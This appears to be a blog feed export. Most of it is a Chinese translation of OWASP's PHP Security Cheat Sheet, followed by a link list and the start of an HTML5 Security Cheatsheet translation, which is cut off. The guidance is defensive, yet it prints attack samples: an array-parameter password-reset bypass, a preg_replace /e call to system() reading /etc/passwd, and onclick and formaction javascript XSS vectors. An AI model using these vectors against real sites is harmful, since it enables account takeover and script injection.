<p>如果使用native的数据库API，需要在各个地方添加错误检查。然而由于这需要额外的工作、又如此容易被忽略，所以它是’默认不安全的’。这就是为什么访问数据库通常要采用<a href="https://secure.php.net/manual/en/intro.pdo.php" target="_blank" rel="external">PHP Data Objects (PDO)</a>和其错误处理<a href="https://secure.php.net/manual/en/pdo.error-handling.php" target="_blank" rel="external"> ERRMODE_WARNING or ERRMODE_EXCEPTION flags </a>，除非有特殊的原因，不会使用native API和错误检查工作。</p>
<p>使用<a href="http://www.php.net/manual/en/function.error-reporting.php" target="_blank" rel="external">error_reporting</a>函数将错误优先级设置越高越好，修复warnings，让系统越鲁棒越好。</p>
<h4 id="php-ini">php.ini</h4><p>PHP代码的行为经常强依赖于很多配置文件的设置，例如基本的错误处理配置等。这使得很难写出在所有场景下正常运行的代码。不同的库依赖不同的设置，使得很难使用第三方的代码，这在后面的’配置’部分也会提到。</p>
<h4 id="无用的buildin函数">无用的buildin函数</h4><p>PHP提供了大量的内嵌函数，例如<code>addslashes</code>、<code>mysql_escape_string</code>、<code>mysql_real_escape_string</code>等。这些试图提供安全的特性的函数经常是有bug的，并不能解决安全性的问题。许多内嵌的函数已经被弃用或者迁移，但由于向下兼容的规则，这些函数会保留很长时间。</p>
<p>PHP会提供<code>array</code>的数据结构，在各种代码中随意使用，但由于混合了数组和字典，经常导致混淆。这种混淆经常导致甚至是有经验的程序员引入重大的安全隐患，例如<a href="https://www.drupal.org/SA-CORE-2014-005" target="_blank" rel="external">Drupal SA-CORE-2014-005</a> 和 <a href="http://cgit.drupalcode.org/drupal/commit/?id=26a7752c34321fd9cb889308f507ca6bdb777f08" target="_blank" rel="external">the patch</a>。</p>
<h3 id="框架相关">框架相关</h3><h4 id="URL路由">URL路由</h4><p>PHP默认的路由机制是使用文件目录中<code>.php</code>的后缀，这带来很多风险</p>
<ul>
<li><p>文件上传没有进行文件名过滤导致的远程执行风险（换句话说，服务化器执行了外部的代码）。在接收远程文件上传时，请确保文件名和内容经过过滤。</p>
</li>
<li><p>源代码和配置文件存储在公共可访问的目录中，可以被下载。误配置或者缺少配置可能会导致源代码或者包含密码等信息的配置文件被攻击者随意下载（换句话说，服务器暴露了私密的信息）。你可以使用<code>.htaccess</code>来限制访问，但这并不是最完美的方案，因为它是’默认不安全的’，也没有可替代的方案。</p>
</li>
<li><p>URL路由机制只是模块系统。这意味着攻击者可能可以使用非法的文件名作为进入点，带来认证机制可能被完全绕过的风险。这在PHP中极其容易，因为有全局可访问的请求信息（例如<code>$_GET</code>），所以文件层面的代码即可操作整个请求、而不是在固定的函数中进行请求处理。</p>
</li>
<li><p>URL路由机制的缺失导致开发者开发各自的路由方法。这往往是不安全的，容易导致请求处理函数未进行合适的请求限制。</p>
</li>
</ul>
<h4 id="输入处理">输入处理</h4><p>PHP将HTTP的输入转换成了数组、而不是简单字符串。这会导致对于数据的混淆，容易导致安全风险。例如下面的代码是一个密码重置的一次性机制判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$supplied_nonce = $_GET[&#39;nonce&#39;];&#10;$correct_nonce = get_correct_value_somehow();&#10;&#10;if (strcmp($supplied_nonce, $correct_nonce) == 0) &#123;&#10;    // Go ahead and reset the password&#10;&#125; else &#123;&#10;   echo &#39;Sorry, incorrect link&#39;;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>如果攻击者使用如下的查询字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?nonce[]=a</span><br></pre></td></tr></table></figure>
<p>会导致<code>$supplied_nonce</code>成为数组、<code>strcmp()</code>函数会返回NULL（连异常都不会抛出），由于若类型转换和没有使用<code>===</code>操作符，校验成功，攻击者可以在不提供原密码的情况下进行密码修改。</p>
<p>相似的case和<code>array</code>结构导致的混淆事故，可以在<a href="https://www.drupal.org/SA-CORE-2014-005" target="_blank" rel="external"> Drupal SA-CORE-2014-005 </a>，参见<a href="http://www.zoubi.me/blog/drupageddon-sa-core-2014-005-drupal-7-sql-injection-exploit-demo" target="_blank" rel="external"> example exploit</a>。</p>
<h4 id="模板语言">模板语言</h4><p>PHP本质上是一门模板语言，但它默认并没有提供HTML转义，在web应用中带来极大使用困难，可以参见下面的XSS部分。</p>
<h4 id="其它不足">其它不足</h4><p>另外有很多web框架应该支持的重要特性，例如默认开启CSRF的保护机制。因为PHP只是提供了一个基本的、功能足够的特性来创建web站点，很多不了解CSRF保护机制的人就仅使用了PHP基本的功能。</p>
<h3 id="第三方PHP代码">第三方PHP代码</h3><p>由于上述原因，PHP项目和开源库经常是不安全的，特别是没有使用恰当的框架时。不要轻易相信你在网络上发现的PHP代码，看起来没问题的代码可能隐藏了很多的安全隐患。</p>
<p>书写不规范的代码会导致warning信息被隐藏，无法及时暴露问题。通常人们会关闭notice信息，但绝不要这么做，这带来更严重的后果。</p>
<h2 id="定期升级PHP">定期升级PHP</h2><p>要定期升级生产环境的PHP版本。因为每天都有新的PHP漏洞被暴露出来，攻击者经常会用这些漏洞攻击网络上任意的服务器。</p>
<h1 id="配置">配置</h1><p>配置文件对PHP的行为影响极大，包括<code>php.ini</code>文件、Apache配置命令和<a href="http://www.php.net/manual/en/configuration.php" target="_blank" rel="external">运行时机制</a>。</p>
<p>有很多不安全的设置，下面是一部分。</p>
<h2 id="setHandler">setHandler</h2><p>setHandler命令可以配置PHP代码，在很多场景中，它被用<code>addHandler</code>指令错误的替代，<code>addHanler</code>可以正常工作，但也会使很多其它文件像PHP一样执行，例如一个文件名为<code>foo.php.ini</code>的文件也会被当做php来执行。这会带来严重的远程执行的风险，如果该文件是被恶意上传。</p>
<h1 id="不可信的数据">不可信的数据</h1><p>All input is evil，所有用户的输入都不值得信任。输入必须被用合适的方式校验、或者过滤。</p>
<p><code>$_SERVER</code>、<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>、<code>$_FILES</code>和<code>$_COOKIE</code>这些超全局变量也不应该被信任。尽管<code>$_REQUEST</code>中并非所有的数据都可以被用户伪造，但还是有相当部分的可能被伪造，特别是处理HTTP header的那部分(以HTTP_开头的)。</p>
<h2 id="文件上传">文件上传</h2><p>来自用户上传的文件会带来巨大的安全隐患，特别是该文件可以被其他用户下载时。例如：</p>
<ul>
<li>任何HTML文件可能会导致xss攻击。</li>
<li>任何PHP文件可能会带来远程代码执行的风险。</li>
</ul>
<p>由于PHP对于代码执行的检查并不严格（带上合适的扩展名即可），对于使用PHP搭建的web服务器一定要确保上传进行合适的文件名过滤后再进行保存。</p>
<h2 id="处理$_FILES数组的常见错误">处理$_FILES数组的常见错误</h2><p>如下的代码片段、或者类似功能的代码是很常见的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($_FILES[&#39;some_name&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) &#123;  &#10;   //Proceed to accept the file as a valid image&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>然而<code>type</code>并不是启发式的去校验的，而仅仅是接收了HTTP请求中的数据，这很容易被客户端伪造。一个更好的去校验文件类型的方法是使用<code>finfo</code>库，尽管这种方法也并不完美。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$finfo = new finfo(FILEINFO_MIME_TYPE);&#10;$fileContents = file_get_contents($_FILES[&#39;some_name&#39;][&#39;tmp_name&#39;]);&#10;$mimeType = $finfo-&#62;buffer($fileContents);</span><br></pre></td></tr></table></figure>
<p>尽管这会占用服务器的计算资源，但<code>$mimeType</code>是更好的判断文件类型的方式，会阻止一些用户上传危险的文件，并伪装成image等形式，来造成攻击行为。</p>
<h2 id="使用$_REQUEST">使用$_REQUEST</h2><p>强烈不建议使用<code>$_REQUEST</code>。这个超全局变量不仅包含了GET和POST，还包含了用户请求的cookies等信息，所有的这些数据被组合在了一个数组里，导致很难检测数据的来源，很容易导致混淆、易于犯错、容易导致安全风险。</p>
<h1 id="数据库">数据库</h1><p>单个mysql注入就会直接操纵整个网站，所以每个黑客都会首先尝试mysql注入，防止mysql注入也是PHP安全站点中最应该考虑的，遵循如下规则：</p>
<h2 id="不要在SQL中连接或者插入数据">不要在SQL中连接或者插入数据</h2><h3 id="不要直接使用用户数据的string构造SQL">不要直接使用用户数据的string构造SQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &#34;SELECT * FROM users WHERE username = &#39;&#34; . $username . &#34;&#39;;&#34;;</span><br></pre></td></tr></table></figure>
<p>或者使用如下SQL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &#34;SELECT * FROM users WHERE username = &#39;$username&#39;;&#34;;</span><br></pre></td></tr></table></figure>
<p>如果<code>$username</code>来自不可信任的来源，它可以包含类似于<code>&#39;</code>这样的字符，从而可以执行其它命令，甚至删除数据库命令。使用prepare语句和绑定参数是更好的解决方案。PHP的<a href="http://php.net/mysqli" target="_blank" rel="external">mysqli</a>和<a href="https://secure.php.net/pdo" target="_blank" rel="external">PDO</a>提供了相关的特性。</p>
<h3 id="转义是不安全的">转义是不安全的</h3><p><code>mysql_real_escape_string</code>这种转义是不安全的。不要依赖这个函数来防止SQL注入。</p>
<p>当你使用<code>mysql_real_escape_string</code>来校验每个变量然后放入查询语句中，你难保一次都不会忘记，只要忘记一次就会是灾难。你无法保证一次都不会忘记。而且，你要保证你使用了引号，如果输入是数字的话，这会很不自然，容易忘记。使用prepare语句或者相似的API，它们会帮你做正确的转义和过滤。（大部分ORM框架也会做这种转义、帮你创建SQL）</p>
<h3 id="使用prepare语句">使用prepare语句</h3><p>prepare语句非常安全。在prepare语句中，SQL命令和数据是分开的，每个用户输入都会认为是数据，进行处理。</p>
<p>相关的内容可以参考PHP的<a href="https://secure.php.net/manual/en/mysqli.quickstart.prepared-statements.php" target="_blank" rel="external">mysqli prepare statement</a>和<a href="https://secure.php.net/manual/en/pdo.prepare.php" target="_blank" rel="external">PDO prepare statement</a></p>
<h4 id="prepare语句失效的场景">prepare语句失效的场景</h4><p>进行动态的查询、不支持prepare的变量，或者数据库引擎不支持prepare语句会是问题。例如，PDO MySQL不支持<code>？</code>作为限制符。而且限制符不能作为表名或者列名用于<code>select</code>语句中。在此类的场景中，尽量使用框架提供的query builder，如果框架没有功能，使用Composer和Packagist安装几个第三方包，不要自己做。</p>
<h3 id="ORM">ORM</h3><p>ORM(Object Relational Mappers)，即对象关系映射，是非常好的安全手段。如果你使用ORM（例如<a href="http://www.doctrine-project.org/" target="_blank" rel="external">Doctrine</a>），仍然可能会遭受SQL攻击。尽管ORM中注入攻击比较困难，不过串联ORM查询和串联SQL查询具有相同的问题。ORM也支持prepare语句。</p>
<h3 id="编码事宜">编码事宜</h3><h4 id="尽量使用UTF-8编码">尽量使用UTF-8编码</h4><p>许多新型攻击模式依赖于编码。使用UTF-8作为数据库和应用的字符集，除非你有对其它字符集的强依赖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$DB = new mysqli($Host, $Username, $Password, $DatabaseName);&#10;if (mysqli_connect_errno())&#10;trigger_error(&#34;Unable to connect to MySQLi database.&#34;);&#10;$DB-&#62;set_charset(&#39;UTF-8&#39;);</span><br></pre></td></tr></table></figure>
<h1 id="其它注入">其它注入</h1><p>除了SQL以外，还有PHP中别的注入的可能性</p>
<h2 id="脚本注入">脚本注入</h2><p>一些PHP函数例如：</p>
<ul>
<li>shell_exc</li>
<li>exec</li>
<li>passthru</li>
<li>system</li>
<li>反引号(`)</li>
</ul>
<p>上面的函数或者命令将字符串作为脚本和命令名。基于配置，脚本命令泄露可以导致应用设置和配置文件泄露，这是非常严重的风险，会导致整个网站被控制。</p>
<p>不要向这些函数传入未经过滤的输入，除非你确认它们一定是安全的。转义和其他对策是无效的，攻击者会尝试各种测试向量，不要相信新手程序员。</p>
<h2 id="代码注入">代码注入</h2><p>所有的解释型语言，例如PHP，具有将字符串转换成命令并执行的能力。PHP中这个函数是<code>eval()</code>，使用<code>eval()</code>是不安全的，并不建议使用，除非你确认除了<code>eval</code>以外没有别的选择。<code>eval()</code>性能比较差。</p>
<p>不要轻易在<code>preg_replace()</code>中输入未经过滤的输入，因为payload会被<a href="https://stackoverflow.com/questions/4289923/in-which-languages-is-it-a-security-hole-to-use-user-supplied-regular-expression/4292439#4292439" target="_blank" rel="external"><code>eval()&#39;ed</code></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#34;/.*/e&#34;,&#34;system(&#39;echo /etc/passwd&#39;)&#34;);</span><br></pre></td></tr></table></figure>
<p>Reflection也有代码注入的风险。这属于高级的话题，请参考相关文档。</p>
<h2 id="其它注入-1">其它注入</h2><p>LDAP、XPath和其他一些使用数组作为输入的第三方库，也容易被注入攻击。时刻记住有些数组不仅仅是数据，而是命令，所以在输入第三方库之前要进行检查。</p>
<h1 id="XSS">XSS</h1><p>提到XSS时，主要指两个场景，分别可以通过如下方式缓解：</p>
<h2 id="没有tags">没有tags</h2><p>大部分时候，用户不会提供未经转义的HTML标签。例如在一个cell或者textbox中输出用户数据。</p>
<p>如果需要使用标准的PHP来输出(echo)模板，你可以通过对数据进行<code>htmlspecialchars</code>（或者下面的函数，对htmlspecialchars的封装）缓解XSS。尽管这并不推荐，因为需要开发者在每个使用场景都要调用。如果开发者忘记了，就存在XSS的风险。我们认为默认不安全的方法就是不安全的。</p>
<p>除此之外，你可以使用默认进行HTML转义的模板引擎。所有需要输出到模板的HTML都需要经过HTML模板。</p>
<p>如果你的项目不能转换到一个安全的模板引擎，你可以使用下面的函数来过滤数据。</p>
<p>需要注意的是下面的函数对于<code>style</code>、<code>script</code>、<code>image</code>、<code>src</code>、<code>a</code>等等不安全的元素是无效的。所有输出到浏览器的数据，都要经过下面函数的过滤。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//xss mitigation functions&#10;function xssafe($data,$encoding=&#39;UTF-8&#39;)&#10;&#123;&#10;    return htmlspecialchars($data,ENT_QUOTES |ENT_HTML401,$encoding);&#10;&#125;&#10;&#10;function xecho($data)&#10;&#123;&#10;    echo xssafe($data);&#10;&#125;&#10;&#10;//usage example&#10;&#60;input type=&#39;text&#39; name=&#39;test&#39; value=&#39;&#60;?php xecho (&#34;&#39; onclick=&#39;alert(1)&#34;);?&#62;&#39; /&#62;</span><br></pre></td></tr></table></figure>
<h2 id="不可信的tags">不可信的tags</h2><p>当你需要用户在你输出时提供HTML tags时（例如富文本博客评论、博客等等），但不是很信任使用者时，你需要使用安全编码库。这很困难，迁移过程也很慢，所以大量的网络应用有XSS注入攻击的风险。OWASP ESAPI对于不同类型数据的编码具有大量的编解码器，也有PHP的OWASP AntiSammy和HTMLPurifier。这需要一定的配置和学习的成本，但对于一个好的网络应用，是必不可少的。</p>
<h2 id="模板引擎">模板引擎</h2><p>有一些模板引擎可以帮助开发者或者设计者输出数据，防止XSS攻击。尽管模板引擎的初衷并不是安全、而是增加设计的体验，但大部分引擎输出时自动转义了变量，或者要求开发者显式的指定不需要转义的变量。这使得输出数据默认是安全的。类似的引擎包括twig、Smarty、Haanga和Rain TPL。</p>
<p>模板引擎是很好的安全实践，因为它提供了开发者容易忘记的特性，默认的进行XSS保护的转义。对于安全很看重的系统应该使用默认安全的引擎。</p>
<h2 id="其它建议">其它建议</h2><ul>
<li>在web应用中，没有可信任的区域。很多开发者会留着网站的admin部分不进行XSS过滤，事实上大部分攻击者都会对admin的cookie的XSS感兴趣。任何需要输出的变量都要用上面提到的方案进行处理。删除每个<code>echo</code>，<code>print</code>和<code>printf</code>，替换成安全的模板引擎。</li>
<li>HTTP-Only cookies是很好的实践，很快每个浏览器都会支持。建议现在就开始使用。</li>
<li>上面提供的函数只支持HTML语法。如果你put your Element Attributes without quotation，你就死定了。</li>
<li><a href="https://www.owasp.org/index.php/Reflected_XSS" target="_blank" rel="external">反射型XSS</a>和普通的XSS一样危险，可能出现在应用中任何部分。找到并解决它们。</li>
<li>并不是所有的PHP都安装了mhash扩展，如果要做hash，需要先检查一下。否则你不能用SHA-256</li>
<li>并不是所有的PHP都安装了mcrypt扩展，如果没安装，你没法做AES，使用前请先进行检查。</li>
</ul>
<h1 id="CSRF">CSRF</h1><p>CSRF是修复理论上比较简单，但正确的修复确并不容易。首先提几个关于CSRF的tips：</p>
<ul>
<li>每个请求都是有用的，都要做CSRF的修复。不仅仅包括修改的请求、还包括执行时间较长的读请求。</li>
<li>CSRF容易发生在GET，也不要忽略POST。不要认为POST是安全的。</li>
</ul>
<p><a href="https://www.owasp.org/index.php/PHP_CSRF_Guard" target="_blank" rel="external"> OWASP PHP CSRFGuard</a>这是一个代码片段，讲了如何进行CSRF的修复。仅仅复制粘贴是无效的，后面会发布一个拷贝粘贴版本。当前，使用上面代码结合如下建议：</p>
<ul>
<li>对于重要的操作（修改密码、修改邮箱等）使用二次认证。</li>
<li>如果你不清楚你的请求是否能够免于CSRF，使用验证码（尽管验证码会让用户体验变差）</li>
<li>如果你的请求依赖于其它请求的部分内容（例如其它请求的cookies或者http header等部分），你也要对那些请求添加CSRF tokens。</li>
<li>AJAX的请求需要重建CSRF tokens。使用上面提供的代码，不要只依赖javscript。</li>
<li>CSRF会导致不便，结合你的设计和架构来使用。</li>
</ul>
<h1 id="认证和SESSION管理">认证和SESSION管理</h1><p>PHP并没有提供一个真正可用的认证模块，你需要基于自身的框架自行实现。然而用这种方式，很多PHP框架在这方面并不完美，因为它们都是被开源社区的开发者而不是安全专家开发出来的。下面有几个建议：</p>
<h2 id="session管理">session管理</h2><p>PHP默认的session机制是安全的，生成的PHPSessionID足够随机，但是存储未必是安全的：</p>
<ul>
<li>Session文件默认存储在temp目录(/tmp)，除非安装了suPHP，否则全局可访问。所有任何的LFI或者泄露都可以操作他们。</li>
<li>默认配置下Session是存储在文件中的，这对于高访问量的网站来说，太慢了。你可以存储在memory文件中。</li>
<li>你可以自己实现session机制，不再依赖PHP本身。可以将session存储在数据库，利用全部、部分或者直接不用php的session功能。</li>
</ul>
<h3 id="session劫持预防">session劫持预防</h3><p>将session绑定到IP地址是好的习惯，这将很大程度上解决session劫持的场景。很多用户如果使用匿名工具（例如TOR），访问你的系统就可能出问题。</p>
<p>在session第一次创建时，存储客户端的IP地址，确保后面的请求都是相同来源。下面的代码返回了客户端的IP地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$IP = getenv ( &#34;REMOTE_ADDR&#34; );</span><br></pre></td></tr></table></figure>
<p>在本地环境下，无法获得有效的IP地址，可能是<code>:::1</code>或者<code>:::127</code>，调整你的IP检查逻辑。另外要注意使用<code>HTTP_X_FORWARDED_FOR</code>变量的相似代码，因为该数据可以被用户随意修改，易于被欺骗。（<a href="http://www.thespanner.co.uk/2007/12/02/faking-the-unexpected/" target="_blank" rel="external">这里</a>和<a href="http://security.stackexchange.com/a/34327/37" target="_blank" rel="external">这里</a>）</p>
<h3 id="将sessionid失效">将sessionid失效</h3><p>当发生异常时，需要将session相关信息失效（删除cookie、删除session存储、删除其他痕迹），记录日志是很好的做法。很多系统还会通过邮件通知用户。</p>
<h3 id="session重置">session重置</h3><p>当替换行为发生时，需要将session进行重置（例如当用户登录时）。</p>
<h3 id="暴露的session">暴露的session</h3><p>sessonid应该是机密的，应用不应该在任何场合将它暴露在外面。不要讲sessionid用在url中的一部分。当sessoin传递机密数据时，使用TLS，否则可能发生session劫持。</p>
<h3 id="Session_Fixation">Session Fixation</h3><p>使用<code>session_regenerate_id()</code>来替换sessonid，当用户登录时（甚至每个请求以后）</p>
<h3 id="session过期">session过期</h3><p>session应该在一定时间后失效，无论是活动还是静止状态。超时的操作包括在活动状态下重置sessionid和静止状态下删除session信息。</p>
<p>当退出登录发生时，完成所有的工作，包括清空相关的所有sesson记录。</p>
<h4 id="不活动状态的超时">不活动状态的超时</h4><p>如果当前的请求在上次请求以后已经经过了超过X秒，将其超时。这种清空需要在每次请求的时候进行判断，通常这个时间是30分钟，但也要根据具体应用来确定。</p>
<p>这种超时使得用户在一台公共的机器登录后忘记登出时获得一定的安全退出机制。也一定程度上预防了session劫持。</p>
<h4 id="正常的超时">正常的超时</h4><p>如果当前的session已经经过了一定的时间，即使处于活跃状态，也将其超时。超时时间通常在一天和一周之间不等。实现该特性需要记录session的开始时间。</p>
<h3 id="Cookies">Cookies</h3><p>处理PHP的cookie有一些tricks：</p>
<h4 id="不要序列化">不要序列化</h4><p>不要序列化cookie中的数据，因为很容易被操作篡改，增加攻击数据。</p>
<h4 id="恰当删除">恰当删除</h4><p>要安全的删除cookie，使用如下的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie ($name, &#34;&#34;, 1);&#10;setcookie ($name, false);&#10;unset($_COOKIE[$name]);</span><br></pre></td></tr></table></figure>
<p>第一行保证了浏览器过期了cookie数据，第二行是标准的删除cookie的方法，第三行从脚本中删除了cookie信息。很多手册中使用了<code>time()-3600</code>来做超时，但在浏览器时间不准确的情况下会无效。</p>
<p>可以使用<code>session_name()</code>来获得php默认session cookie名。</p>
<h4 id="HTTP_only">HTTP only</h4><p>现代的浏览器支持HTTP-Only的cookies，这种cookie只可以通过HTTP(s)请求访问，不能被javascript访问，所以XSS的代码无法访问。这是很好的安全实践，但是并不能很令人满意，因为很多主流的浏览器发现了很多Http-Only的cookie暴露给JavaScript的bug。</p>
<p>PHP5.2+版本支持Http-Only cookie，你要手动设置http session cookie（不是使用session_start）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#prototype&#10;bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )&#10;&#10;#usage&#10;if (!setcookie(&#34;MySessionID&#34;, $secureRandomSessionID,$generalTimeout, $applicationRootURLwithoutHost, NULL, NULL,true))&#10;echo (&#34;could not set HTTP-only cookie&#34;);</span><br></pre></td></tr></table></figure>
<p><code>$path</code>参数指定了cookie的有效范围，例如，如果你的网址是<code>example.com/some/folder</code>，<code>$path</code>应该是<code>/some/folder</code>，否则所有在<code>example.com</code>的应用都可以读取你的cookie。如果你使用全域名，可以忽略。域名参数强制了可访问域名，如果需要在多个域和IP访问，忽略该参数，否则老老实实设置。 如果安全参数设置，cookie可以通过HTTPs传递，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$r=setcookie(&#34;SECSESSID&#34;,&#34;1203j01j0s1209jw0s21jxd01h029y779g724jahsa9opk123973&#34;,time()+60*60*24*7 /*a week*/,&#34;/&#34;,&#34;owasp.org&#34;,true,true);&#10;if (!$r) die(&#34;Could not set session cookie.&#34;);</span><br></pre></td></tr></table></figure>
<h4 id="浏览器相关">浏览器相关</h4><p>很多浏览器都有cookies的问题，大部分可以通过设置超时时间为0来解决。</p>
<h2 id="认证">认证</h2><h3 id="Remember_me">Remember me</h3><p>很多浏览器在Remember me特性上存在风险。通常的方式是生成一次性的token，存储在用户cookie中，另外在服务端也要存储用于校验。这个token应该和用户名密码没有任何关系，一个长随机数是推荐的做法。</p>
<p>如果能够做到防止蛮力破解Remember me的token，增加锁定措施，是更好的做法。</p>
<ul>
<li>不要在cookie中存储和用户名、密码相关的任何数据</li>
</ul>
<h1 id="配置和部署">配置和部署</h1><p>配置请参见<a href="https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet" target="_blank" rel="external">PHP配置安全手册</a></p>
<h1 id="来源相关">来源相关</h1><p>本博客来源于对OWSAP的<a href="https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet" target="_blank" rel="external">PHP Security Cheat Sheet</a>的翻译，翻译权所有，转载请注明。</p>
<p>其它安全相关</p>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series" target="_blank" rel="external">OWASP Cheat Sheet Series</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>译者：<a href="https://github.com/fisherMartyn">fisherMartyn</a></p>
<p>来源：<a href="https://github.com/fisherMartyn/PHP-SECURITY-CHEAT-SHEET">PHP-SECURITY-CHEAT-SHEET</a></p>
</blockquote>
<h1 id="介绍">介绍</h1><p>这篇博客是翻译自OWSAP的<a href ="https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet">PHP Security Cheat Sheet</a>，你可以查看原文。</p>
<p>本文章的目的是提供基本的PHP安全建议，主要针对开发者和系统管理员。需要注意的是这里提到的安全建议可能并不足已支撑安全的网络应用，而只是一个组成部分。]]>
    
    </summary>
    
      <category term="渗透" scheme="http://it-ebooks.flygon.net/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[“资料汇总”的汇总]]></title>
    <link href="http://it-ebooks.flygon.net/awesome-awesomeness/"/>
    <id>http://it-ebooks.flygon.net/awesome-awesomeness/</id>
    <published>2016-02-17T14:23:36.000Z</published>
    <updated>2016-02-17T14:29:10.524Z</updated>
    <content type="html"><![CDATA[<ul>
<li><a href="https://github.com/jobbole/awesome-android-cn" target="_blank" rel="external">Android 资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-c-cn" target="_blank" rel="external">C 资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-cpp-cn" target="_blank" rel="external">C++ 资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-css-cn" target="_blank" rel="external">CSS 资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-dotnet-cn" target="_blank" rel="external">DotNet 资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-go-cn" target="_blank" rel="external">Go 资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-java-cn" target="_blank" rel="external">Java资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-javascript-cn" target="_blank" rel="external">JavaScript 资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-ios-cn" target="_blank" rel="external">iOS 资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-machine-learning-cn" target="_blank" rel="external">机器学习资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-mysql-cn" target="_blank" rel="external">MySQL 资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-php-cn" target="_blank" rel="external">PHP资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="external">Python资源大全中文版</a></li>
<li><a href="https://github.com/jobbole/awesome-sysadmin-cn" target="_blank" rel="external">系统管理员资源大全中文版</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<ul>
<li><a href="https://github.com/jobbole/awesome-android-cn" target="_blank" rel="external">Android 资源大全中文版</a></li>
<li><a href="https:]]>
    </summary>
    
      <category term="综合" scheme="http://it-ebooks.flygon.net/tags/%E7%BB%BC%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[HTML5 Security Cheatsheet]]></title>
    <link href="http://it-ebooks.flygon.net/html5-security-cheatsheet/"/>
    <id>http://it-ebooks.flygon.net/html5-security-cheatsheet/</id>
    <published>2016-02-16T14:19:53.000Z</published>
    <updated>2016-02-16T14:19:21.383Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>来源：<a href="https://html5sec.org/" target="_blank" rel="external">HTML5 Security Cheatsheet</a></p>
</blockquote>
<a id="more"></a>
<h2 id="HTML5特性向量">HTML5特性向量</h2><h3 id="通过formaction属性进行XSS_-_需要用户进行交互_(1)#1test">通过formaction属性进行XSS - 需要用户进行交互 (1)<a href="#1">#1</a><a href="test/#1">test</a></h3><p>这个向量展示了通过HTML5的form和formaction从外部劫持表单的一种方法.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;form id=&#34;test&#34;&#62;&#60;/form&#62;&#60;button form=&#34;test&#34; formaction=&#34;javascript:alert(1)&#34;&#62;X&#60;/button&#62;</span><br></pre></td></tr></table></figure>
<p>不要让用户提交包含 “form” 和 “formaction”属性的标签.避免在form中出现id属性及提交按钮.</p>
<ul>
<li>firefox 4.0</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 10.5</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 10.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0.4</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>internet explorer 10</p>
</li>
<li><p>internet explorer latest (inside form element)</p>
</li>
<li><p>xss</p>
</li>
<li>html5</li>
<li>opera</li>
<li>chrome</li>
<li>firefox</li>
<li>formaction</li>
<li>javascript</li>
<li><p>button</p>
</li>
<li><p><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="通过autofocus属性执行本身的focus事件#7test">通过autofocus属性执行本身的focus事件<a href="#7">#7</a><a href="test/#7">test</a></h3><p>这个向量是使焦点自动跳到输入元素上,触发焦点事件 - 无需用户交互</p>
